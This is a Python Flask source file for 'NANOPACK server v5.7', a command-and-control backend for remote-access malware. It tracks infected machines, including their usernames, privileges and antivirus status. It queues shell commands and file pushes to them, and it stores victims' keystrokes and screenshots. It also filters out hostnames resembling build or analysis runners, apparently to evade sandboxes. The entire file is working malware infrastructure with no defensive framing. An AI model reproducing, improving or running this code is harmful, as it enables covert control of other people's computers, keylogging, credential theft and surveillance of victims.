#!/usr/bin/env python3
"""NANOPACK server v5.7 — no token, hostname filter, live status."""
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from flask_socketio import SocketIO
import time, uuid, sqlite3, os, hashlib, logging, re, mimetypes
from datetime import datetime
from cryptography.fernet import Fernet

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 200 * 1024 * 1024
CORS(app, origins="*")
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

DATABASE = os.environ.get('NANOPACK_DB', 'nanopack.db')
ONLINE_THRESHOLD = 15
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
for d in ['downloads', 'executables', 'screenshots', 'keylogs', 'passwords', 'uploads']:
    os.makedirs(os.path.join(BASE_DIR, d), exist_ok=True)

ID_RE = re.compile(r'^[A-Za-z0-9_\-]{6,128}$')
PHANTOM_RE = re.compile(r'^(srv-|dpl-|app-|build-|worker-|runner-)', re.IGNORECASE)

def _is_phantom(cid, hostname):
    if not cid: return True
    if PHANTOM_RE.match(cid): return True
    if hostname and PHANTOM_RE.match(str(hostname)): return True
    if hostname and len(str(hostname)) >= 8 and re.match(r'^[a-z]{3,5}-[a-z0-9]{8,}$', str(hostname)): return True
    return False

def _confine(base, *parts):
    p = os.path.realpath(os.path.join(base, *parts))
    b = os.path.realpath(base)
    if not p.startswith(b + os.sep) and p != b: return None
    return p

def _valid_cid(cid): return isinstance(cid, str) and bool(ID_RE.match(cid))
def _clip(v, n): return None if v is None else str(v)[:n]

def init_db():
    conn = sqlite3.connect(DATABASE, timeout=30)
    c = conn.cursor()
    c.execute("PRAGMA journal_mode=WAL"); c.execute("PRAGMA busy_timeout=5000"); c.execute("PRAGMA synchronous=NORMAL")
    c.execute("CREATE TABLE IF NOT EXISTS clients (id TEXT PRIMARY KEY, hostname TEXT, username TEXT, os TEXT, os_version TEXT, arch TEXT, cpu TEXT, ram TEXT, gpu TEXT, ip TEXT, last_seen REAL, status TEXT, privileges TEXT, av_status TEXT, keylogger_active INTEGER DEFAULT 0, created_at REAL, online_hours REAL DEFAULT 0, install_id TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS commands (id TEXT PRIMARY KEY, client_id TEXT, command TEXT, command_type TEXT, status TEXT, output TEXT, created_at REAL, executed_at REAL, priority INTEGER DEFAULT 5, require_admin INTEGER DEFAULT 0)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_cmd_client ON commands(client_id, status)")
    c.execute("CREATE TABLE IF NOT EXISTS files (id TEXT PRIMARY KEY, client_id TEXT, filename TEXT, original_name TEXT, filepath TEXT, filetype TEXT, filesize INTEGER, uploaded_at REAL, downloaded INTEGER DEFAULT 0, hash_md5 TEXT, hash_sha256 TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS keylogs (id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT, keystrokes TEXT, window_title TEXT, timestamp REAL, process_name TEXT)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_kl_client ON keylogs(client_id, timestamp)")
    c.execute("CREATE TABLE IF NOT EXISTS screenshots (id TEXT PRIMARY KEY, client_id TEXT, timestamp REAL, filepath TEXT, width INTEGER, height INTEGER, size INTEGER)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_ss_client ON screenshots(client_id, timestamp)")
    c.execute("CREATE TABLE IF NOT EXISTS revoked (id TEXT PRIMARY KEY, revoked_at REAL)")
    conn.commit(); conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DATABASE, timeout=30)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA busy_timeout=5000")
    return conn

def _safe(n):
    s = "".join(ch for ch in (n or '') if ch.isalnum() or ch in ' -_.').strip()
    return s or 'unknown'

def _ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr or '')
    return ip.split(',')[0].strip()

def _body():
    try: return request.get_json(silent=True) or {}
    except Exception: return {}

def fmt(b):
    if not b: return "0B"
    for u in ['B', 'KB', 'MB', 'GB', 'TB']:
        if b < 1024: return "%.2f %s" % (b, u)
        b /= 1024
    return "%.2f PB" % b

def _revoked(cid):
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT 1 FROM revoked WHERE id=?", (cid,))
    r = c.fetchone(); conn.close(); return r is not None

@app.errorhandler(404)
def _404(e): return jsonify(error='not found'), 404
@app.errorhandler(405)
def _405(e): return jsonify(error='method not allowed'), 405
@app.errorhandler(413)
def _413(e): return jsonify(error='payload too large'), 413

@app.route('/')
def index(): return jsonify(status='online', system='NANOPACK', version='5.7')

@app.route('/api/checkin', methods=['POST'])
def checkin():
    try:
        data = _body(); cid = data.get('id')
        if not _valid_cid(cid): return jsonify(error='bad id'), 400
        hostname = data.get('hostname') or 'Unknown'
        if _is_phantom(cid, hostname):
            logger.warning("checkin rejected phantom: cid=%s host=%s", cid, hostname)
            return jsonify(error='phantom'), 400
        if _revoked(cid): return jsonify(error='revoked'), 403
        conn = get_db(); c = conn.cursor()
        now = time.time(); ip = _ip(); host = _clip(hostname, 128)
        c.execute('SELECT * FROM clients WHERE id=?', (cid,)); ex = c.fetchone()
        if ex:
            oh = ex['online_hours'] or 0
            if now - (ex['last_seen'] or 0) > ONLINE_THRESHOLD: oh += (now - ex['last_seen']) / 3600
            c.execute("UPDATE clients SET hostname=?, username=?, os=?, os_version=?, arch=?, cpu=?, ram=?, gpu=?, ip=?, last_seen=?, status='online', privileges=?, av_status=?, online_hours=?, install_id=? WHERE id=?", (host, _clip(data.get('username'), 128), _clip(data.get('os'), 64), _clip(data.get('os_version'), 64), _clip(data.get('arch'), 32), _clip(data.get('cpu'), 128), _clip(data.get('ram'), 32), _clip(data.get('gpu'), 128), ip, now, _clip(data.get('privileges'), 32), _clip(data.get('av_status'), 128), oh, _clip(data.get('install_id'), 128), cid))
        else:
            c.execute("INSERT INTO clients (id, hostname, username, os, os_version, arch, cpu, ram, gpu, ip, last_seen, status, privileges, av_status, keylogger_active, created_at, online_hours, install_id) VALUES (?,?,?,?,?,?,?,?,?,?,?,'online',?,?,0,?,0,?)", (cid, host, _clip(data.get('username'), 128), _clip(data.get('os'), 64), _clip(data.get('os_version'), 64), _clip(data.get('arch'), 32), _clip(data.get('cpu'), 128), _clip(data.get('ram'), 32), _clip(data.get('gpu'), 128), ip, now, _clip(data.get('privileges'), 32), _clip(data.get('av_status'), 128), now, _clip(data.get('install_id'), 128)))
        conn.commit(); conn.close()
        return jsonify(status='ok', timestamp=now)
    except Exception as e:
        logger.error("checkin: %s", e); return jsonify(error=str(e)), 500

@app.route('/api/clients', methods=['GET'])
def clients():
    try:
        conn = get_db(); c = conn.cursor(); now = time.time()
        c.execute("SELECT * FROM clients ORDER BY last_seen DESC")
        out = []
        for r in c.fetchall():
            if _is_phantom(r['id'], r['hostname']): continue
            d = now - (r['last_seen'] or 0)
            if d < ONLINE_THRESHOLD: s = 'online' if d < 5 else 'idle'
            else: s = 'offline'
            out.append(dict(id=r['id'], hostname=r['hostname'], username=r['username'], os=(r['os'] or '') + ' ' + (r['os_version'] or ''), arch=r['arch'], ip=r['ip'], privileges=r['privileges'], status=s, last_seen=r['last_seen'], last_seen_str=datetime.fromtimestamp(r['last_seen']).strftime('%Y-%m-%d %H:%M:%S') if r['last_seen'] else 'never', seconds_ago=round(d, 1), install_id=r['install_id']))
        conn.close(); return jsonify(clients=out)
    except Exception as e:
        logger.error("clients: %s", e); return jsonify(clients=[])

@app.route('/api/client/<cid>', methods=['GET', 'DELETE'])
def client_details(cid):
    if not _valid_cid(cid): return jsonify(error='bad id'), 400
    if request.method == 'DELETE':
        try:
            conn = get_db(); c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO revoked (id, revoked_at) VALUES (?, ?)", (cid, time.time()))
            c.execute("DELETE FROM commands WHERE client_id=? AND status IN ('pending','sent')", (cid,))
            c.execute("DELETE FROM clients WHERE id=?", (cid,))
            conn.commit(); conn.close()
            return jsonify(success=True)
        except Exception as e: return jsonify(error=str(e)), 500
    try:
        conn = get_db(); c = conn.cursor()
        c.execute('SELECT * FROM clients WHERE id=?', (cid,)); cl = c.fetchone()
        if not cl: conn.close(); return jsonify(error='not found'), 404
        c.execute("SELECT * FROM commands WHERE client_id=? ORDER BY created_at DESC LIMIT 30", (cid,))
        cmds = [dict(r) for r in c.fetchall()]; conn.close()
        return jsonify(client=dict(cl), commands=cmds)
    except Exception as e: return jsonify(error=str(e)), 500

@app.route('/api/command', methods=['POST'])
def send_cmd():
    try:
        data = _body(); cid = data.get('client_id'); cmd = data.get('command'); ct = data.get('type', 'shell')
        if not _valid_cid(cid) or not cmd: return jsonify(error='missing'), 400
        if len(cmd) > 16384: return jsonify(error='command too long'), 413
        if _revoked(cid): return jsonify(error='revoked'), 403
        conn = get_db(); c = conn.cursor()
        c.execute('SELECT id FROM clients WHERE id=?', (cid,))
        if not c.fetchone(): conn.close(); return jsonify(error='no client'), 404
        cmd_id = str(uuid.uuid4())
        c.execute("INSERT INTO commands (id, client_id, command, command_type, status, created_at, priority) VALUES (?,?,?,?,'pending',?,5)", (cmd_id, cid, cmd, ct, time.time()))
        conn.commit(); conn.close()
        return jsonify(success=True, command_id=cmd_id)
    except Exception as e: return jsonify(error=str(e)), 500

@app.route('/api/commands/<cid>', methods=['GET'])
def pending(cid):
    if not _valid_cid(cid): return jsonify(commands=[]), 400
    try:
        if _revoked(cid): return jsonify(commands=[], revoked=True)
        wait_max = min(int(request.args.get('wait', 8)), 10)
        deadline = time.time() + wait_max
        while True:
            conn = get_db(); c = conn.cursor()
            c.execute("UPDATE clients SET last_seen=?, status='online' WHERE id=?", (time.time(), cid))
            c.execute("SELECT id, command, command_type FROM commands WHERE client_id=? AND status='pending' ORDER BY priority DESC, created_at ASC LIMIT 10", (cid,))
            cmds = [dict(id=r['id'], command=r['command'], type=r['command_type']) for r in c.fetchall()]
            if cmds:
                ids = [x['id'] for x in cmds]; ph = ','.join(['?'] * len(ids))
                c.execute("UPDATE commands SET status='sent' WHERE id IN (" + ph + ")", ids)
                conn.commit(); conn.close()
                return jsonify(commands=cmds)
            conn.commit(); conn.close()
            if time.time() >= deadline: return jsonify(commands=[])
            time.sleep(0.25)
    except Exception: return jsonify(commands=[])

@app.route('/api/command/result', methods=['POST'])
def cmd_result():
    try:
        data = _body(); cid = data.get('command_id')
        if not cid: return jsonify(error='no id'), 400
        conn = get_db(); c = conn.cursor()
        c.execute("UPDATE commands SET status=?, output=?, executed_at=? WHERE id=?", (data.get('status', 'completed'), _clip(data.get('output', ''), 262144), time.time(), cid))
        conn.commit(); conn.close()
        return jsonify(success=True)
    except Exception as e: return jsonify(error=str(e)), 500

@app.route('/api/file/push', methods=['POST'])
def file_push():
    try:
        if 'file' not in request.files: return jsonify(error='no file'), 400
        f = request.files['file']; cid = request.form.get('client_id')
        if not _valid_cid(cid) or not f.filename: return jsonify(error='missing'), 400
        if _revoked(cid): return jsonify(error='revoked'), 403
        conn = get_db(); c = conn.cursor()
        c.execute('SELECT id FROM clients WHERE id=?', (cid,))
        if not c.fetchone(): conn.close(); return jsonify(error='no client'), 404
        folder = _confine(os.path.join(BASE_DIR, 'uploads'), _safe(cid))
        if not folder: return jsonify(error='bad path'), 400
        os.makedirs(folder, exist_ok=True)
        safe = _safe(f.filename)
        if not safe or safe == 'unknown': return jsonify(error='bad filename'), 400
        path = _confine(folder, safe)
        if not path: return jsonify(error='bad path'), 400
        f.save(path)
        size = os.path.getsize(path)
        h_md5 = hashlib.md5(); h_sha = hashlib.sha256()
        with open(path, 'rb') as fh:
            for chunk in iter(lambda: fh.read(65536), b''):
                h_md5.update(chunk); h_sha.update(chunk)
        fid = str(uuid.uuid4()); cmd_id = str(uuid.uuid4())
        c.execute("INSERT INTO files (id, client_id, filename, original_name, filepath, filetype, filesize, uploaded_at, hash_md5, hash_sha256) VALUES (?,?,?,?,?,?,?,?,?,?)", (fid, cid, safe, f.filename, path, mimetypes.guess_type(safe)[0] or 'application/octet-stream', size, time.time(), h_md5.hexdigest(), h_sha.hexdigest()))
        c.execute("INSERT INTO commands (id, client_id, command, command_type, status, created_at, priority) VALUES (?,?,?,'push','pending',?,9)", (cmd_id, cid, 'PUSH:' + safe, time.time()))
        conn.commit(); conn.close()
        return jsonify(success=True, command_id=cmd_id, file_id=fid, size=size)
    except Exception as e:
        logger.error("file_push: %s", e); return jsonify(error=str(e)), 500

@app.route('/api/file/push/get/<cid>/<name>', methods=['GET'])
def file_push_get(cid, name):
    if not _valid_cid(cid): return jsonify(error='bad id'), 400
    folder = _confine(os.path.join(BASE_DIR, 'uploads'), _safe(cid))
    if not folder: return jsonify(error='bad path'), 400
    path = _confine(folder, _safe(name))
    if not path or not os.path.exists(path): return jsonify(error='not found'), 404
    return send_file(path, as_attachment=True, download_name=_safe(name))

@app.route('/api/keylog', methods=['POST'])
def keylog():
    try:
        data = _body(); cid = data.get('client_id'); ks = data.get('keystrokes')
        if not _valid_cid(cid) or not ks: return jsonify(error='missing'), 400
        if _revoked(cid): return jsonify(error='revoked'), 403
        ks = _clip(ks, 8192)
        conn = get_db(); c = conn.cursor()
        c.execute("INSERT INTO keylogs (client_id, keystrokes, window_title, timestamp, process_name) VALUES (?,?,?,?,?)", (cid, ks, _clip(data.get('window_title', ''), 256), time.time(), _clip(data.get('process_name', ''), 128)))
        conn.commit(); conn.close()
        return jsonify(success=True)
    except Exception as e: return jsonify(error=str(e)), 500

@app.route('/api/keylogs/<cid>', methods=['GET'])
def get_keylogs(cid):
    if not _valid_cid(cid): return jsonify(keylogs=[]), 400
    try:
        limit = min(request.args.get('limit', 200, type=int), 500)
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT keystrokes, window_title, timestamp FROM keylogs WHERE client_id=? ORDER BY timestamp DESC LIMIT ?", (cid, limit))
        out = [dict(keystrokes=r['keystrokes'], window=r['window_title'], time=datetime.fromtimestamp(r['timestamp']).strftime('%H:%M:%S')) for r in c.fetchall()]
        conn.close(); return jsonify(keylogs=out)
    except Exception: return jsonify(keylogs=[])

@app.route('/api/screenshot', methods=['POST'])
def shot():
    try:
        if 'file' not in request.files: return jsonify(error='no file'), 400
        f = request.files['file']; cid = request.form.get('client_id')
        if not _valid_cid(cid) or not f.filename: return jsonify(error='missing'), 400
        if _revoked(cid): return jsonify(error='revoked'), 403
        conn = get_db(); c = conn.cursor()
        c.execute('SELECT hostname FROM clients WHERE id=?', (cid,)); cl = c.fetchone()
        if not cl: conn.close(); return jsonify(error='no client'), 404
        folder = _confine(os.path.join(BASE_DIR, 'screenshots'), _safe(cl['hostname']))
        if not folder: return jsonify(error='bad path'), 400
        os.makedirs(folder, exist_ok=True)
        ts = datetime.now().strftime('%Y%m%d_%H%M%S'); fn = 'screenshot_' + ts + '_' + uuid.uuid4().hex[:6] + '.png'
        path = _confine(folder, fn)
        if not path: return jsonify(error='bad path'), 400
        f.save(path); size = os.path.getsize(path)
        w = h = 0
        try:
            from PIL import Image
            with Image.open(path) as img: w, h = img.size
        except Exception: pass
        sid = str(uuid.uuid4())
        c.execute("INSERT INTO screenshots (id, client_id, timestamp, filepath, width, height, size) VALUES (?,?,?,?,?,?,?)", (sid, cid, time.time(), path, w, h, size))
        conn.commit(); conn.close()
        return jsonify(success=True, screenshot_id=sid)
    except Exception as e:
        logger.error("shot: %s", e); return jsonify(error=str(e)), 500

@app.route('/api/screenshots/<cid>', methods=['GET'])
def shots(cid):
    if not _valid_cid(cid): return jsonify(screenshots=[]), 400
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT id, timestamp, width, height, size FROM screenshots WHERE client_id=? ORDER BY timestamp DESC LIMIT 50", (cid,))
        out = [dict(id=r['id'], time=datetime.fromtimestamp(r['timestamp']).strftime('%Y-%m-%d %H:%M'), dimensions=("%dx%d" % (r['width'], r['height'])) if r['width'] else '?', size=fmt(r['size'])) for r in c.fetchall()]
        conn.close(); return jsonify(screenshots=out)
    except Exception: return jsonify(screenshots=[])

@app.route('/api/screenshot/view/<sid>', methods=['GET'])
def view_shot(sid):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute('SELECT filepath FROM screenshots WHERE id=?', (sid,)); r = c.fetchone(); conn.close()
        if not r: return jsonify(error='not found'), 404
        base = os.path.join(BASE_DIR, 'screenshots')
        if not _confine(base, os.path.relpath(r['filepath'], base)): return jsonify(error='bad path'), 400
        if not os.path.exists(r['filepath']): return jsonify(error='not found'), 404
        return send_file(r['filepath'], mimetype='image/png')
    except Exception as e: return jsonify(error=str(e)), 500

if __name__ == '__main__':
    PORT = int(os.environ.get('PORT', 5000))
    logger.info("[+] NANOPACK server v5.7 on port %s (db=%s)", PORT, DATABASE)
    socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_werkzeug=True)

